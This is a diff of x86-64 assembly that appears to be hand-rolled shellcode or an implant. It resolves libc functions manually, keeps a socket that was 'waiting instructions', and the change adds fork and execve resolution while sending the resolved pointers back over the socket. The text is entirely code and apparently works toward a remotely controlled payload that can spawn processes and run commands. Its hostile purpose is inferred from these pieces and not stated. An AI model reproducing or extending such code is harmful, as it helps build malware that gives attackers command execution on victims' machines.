@@ -131,6 +131,8 @@ resolvefunc close "[rbp - 0x200]"
 resolvefunc read "[rbp - 0x208]"
 resolvefunc write "[rbp - 0x210]"
 #0x218 socket fd
+resolvefunc fork "[rbp - 0x230]"
+resolvefunc execve "[rbp - 0x238]"
 
 
 #socket
@@ -159,7 +161,14 @@ resolvefunc write "[rbp - 0x210]"
     js     result_error
 
 
-dosendtext pttextout3 "[rbp-0x428]" "everything started, waiting instructions\n"
+    lea rsi, [rbp - 0x238]
+    mov edx, 16
+
+    mov     edi, [r15 - 0x218] # fd
+    mov     eax, 0
+    call    [r15 - 0x210] #_write
+
+#dosendtext pttextout3 "[rbp-0x428]" "everything started, waiting instructions\n"
 
 #close socket
     mov     edi, [r15 - 0x218] # fd
@@ -357,20 +366,14 @@ dont_read:
 _strlen:
   push  rcx            # save and clear out counter
   xor   rcx, rcx
-
 _strlen_next:
-
   cmp   byte ptr [rdi], 0  # null byte yet?
   jz    _strlen_null   # yes, get out
-
   inc   rcx            # char is ok, count it
   inc   rdi            # move to next char
   jmp   _strlen_next   # process again
-
 _strlen_null:
-
   mov   rax, rcx       # rcx = the length (put in rax)
-
   pop   rcx            # restore rcx
   ret                  # get out
 
